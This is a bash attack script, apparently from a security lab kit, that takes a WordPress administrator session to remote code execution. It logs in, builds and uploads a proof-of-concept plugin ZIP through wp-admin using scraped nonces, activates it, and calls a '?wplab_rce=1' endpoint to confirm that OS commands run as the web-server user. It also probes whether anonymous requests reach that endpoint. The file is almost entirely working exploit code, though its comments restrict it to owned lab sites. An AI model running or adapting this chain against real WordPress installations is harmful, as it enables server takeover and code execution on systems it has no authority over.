#!/usr/bin/env bash
# Admin -> RCE chain #1: install a ZIP plugin through wp-admin, activate it,
# and call the plugin endpoint that executes a fixed OS command.
#
# Requires: curl, python3 (zip creation), and valid administrator credentials
# for a WordPress site you own/control. Intended for the isolated lab only.
set -euo pipefail

# shellcheck source=./common.sh
source "$(dirname "$0")/common.sh"

SLUG="wp-admin-rce-lab"
PLUGIN_SRC="$LAB_DIR/poc-plugin/$SLUG"
ZIP="$TMP_DIR/$SLUG.zip"
PLUGIN_REL="$SLUG/$SLUG.php"

[ -d "$PLUGIN_SRC" ] || fail "missing plugin source: $PLUGIN_SRC"

echo "[*] target: $BASE_URL"

# 1. Authenticate as administrator.
wp_login "$TMP_DIR/dashboard.html"

# 2. Package the plugin using python3 so the lab does not depend on `zip`.
python3 - "$PLUGIN_SRC" "$ZIP" <<'PY'
import os, sys, zipfile
src, dest = sys.argv[1], sys.argv[2]
root = os.path.basename(src)
with zipfile.ZipFile(dest, "w", zipfile.ZIP_DEFLATED) as zf:
    for base, _dirs, files in os.walk(src):
        for name in files:
            path = os.path.join(base, name)
            arc = os.path.join(root, os.path.relpath(path, src))
            zf.write(path, arc)
print("built", dest)
PY

# 3. Upload through the admin "Upload Plugin" form.
curl -sS --max-time 30 -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
  "$BASE_URL/wp-admin/plugin-install.php?tab=upload" -o "$TMP_DIR/upload.html"
UPLOAD_NONCE="$(nonce "$TMP_DIR/upload.html" _wpnonce)"

curl -sS --max-time 60 -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
  -F "_wpnonce=$UPLOAD_NONCE" \
  -F "_wp_http_referer=/wp-admin/plugin-install.php?tab=upload" \
  -F "pluginzip=@$ZIP;type=application/zip" \
  -F "install-plugin-submit=Install Now" \
  -o "$TMP_DIR/upload-result.html" \
  "$BASE_URL/wp-admin/update.php?action=upload-plugin"

if grep -qiE 'not allowed|does not contain a valid plugin|Unable to communicate' "$TMP_DIR/upload-result.html"; then
  fail "plugin upload rejected (is DISALLOW_FILE_MODS set?)"
fi
echo "[+] plugin ZIP uploaded through wp-admin"

# 4. Activate it (upload page or plugins page provides the nonce link).
ACTIVATE="$(grep -oE 'href="plugins\.php\?action=activate[^"]*"' "$TMP_DIR/upload-result.html" | head -1 | sed -e 's/^href="//' -e 's/"$//' -e 's/&amp;/\&/g' || true)"

if [ -z "$ACTIVATE" ]; then
  curl -sS --max-time 30 -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
    "$BASE_URL/wp-admin/plugins.php" -o "$TMP_DIR/plugins.html"
  ACTIVATE="$(grep -oE "href=\"plugins\\.php\\?action=activate[^\"]*${SLUG}[^\"]*\"" "$TMP_DIR/plugins.html" | head -1 | sed -e 's/^href="//' -e 's/"$//' -e 's/&amp;/\&/g' || true)"
fi

if [ -n "$ACTIVATE" ]; then
  curl -sS --max-time 30 -b "$COOKIE_JAR" -c "$COOKIE_JAR" -L \
    -o "$TMP_DIR/activate.html" "$BASE_URL/wp-admin/$ACTIVATE"
fi

curl -sS --max-time 30 -b "$COOKIE_JAR" "$BASE_URL/wp-admin/plugins.php" -o "$TMP_DIR/plugins-after.html"
if ! grep -q "deactivate-$SLUG" "$TMP_DIR/plugins-after.html"; then
  fail "plugin is not active; activation did not complete"
fi
echo "[+] plugin activated (wp-admin/plugins.php)"

# 5. Prove code execution in the web server process.
echo
echo "[*] requesting /?wplab_rce=1 with the admin session"
RESULT="$(curl -sS --max-time 30 -b "$COOKIE_JAR" -w '\nHTTP_STATUS:%{http_code}' "$BASE_URL/?wplab_rce=1")"
printf '%s\n' "$RESULT" | sed -n '1,/HTTP_STATUS:/p'

grep -q 'uid=' <<<"$RESULT" || fail "endpoint did not return command output"
echo
echo "[+] RCE CONFIRMED: commands ran as the WordPress web-server user."
echo "    anonymous request check:"
curl -sS --max-time 20 -o /dev/null -w '    /?wplab_rce=1 without cookies -> HTTP %{http_code}\n' "$BASE_URL/?wplab_rce=1"
